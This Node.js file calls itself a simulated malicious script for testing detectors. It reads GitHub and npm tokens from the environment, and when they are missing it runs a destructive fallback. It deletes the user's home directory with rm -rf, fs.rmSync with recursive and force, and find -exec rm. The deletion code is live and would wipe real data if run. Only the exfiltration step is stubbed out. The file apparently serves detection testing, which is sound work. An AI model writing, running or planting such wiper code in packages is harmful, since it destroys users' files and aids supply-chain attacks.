// SIMULATED MALICIOUS SCRIPT - Destructive patterns for testing
// This demonstrates the fallback behavior when credential theft fails

const fs = require('fs');
const { spawn } = require('child_process');

async function attemptCredentialTheft() {
    try {
        // Try to steal credentials
        const githubToken = process.env.GITHUB_TOKEN;
        const npmToken = process.env.NPM_TOKEN;

        if (!githubToken || !npmToken) {
            throw new Error("Credentials not found");
        }

        // Simulate exfiltration attempt
        console.log("Attempting credential exfiltration...");

    } catch (error) {
        console.log("Credential theft failed, activating destructive payload");

        // DESTRUCTIVE PATTERNS - These would be detected

        // Pattern 1: Remove user home directory
        spawn('rm', ['-rf', process.env.HOME + '/*'], { stdio: 'inherit' });

        // Pattern 2: Recursive filesystem operations
        try {
            fs.rmSync(process.env.HOME, { recursive: true, force: true });
        } catch (e) {
            console.log("Filesystem destruction failed");
        }

        // Pattern 3: Conditional destruction
        if (error.message.includes("credential")) {
            console.log("Implementing fallback data destruction");
            spawn('find', [process.env.HOME, '-exec', 'rm', '-f', '{}', ';']);
        }
    }
}

attemptCredentialTheft();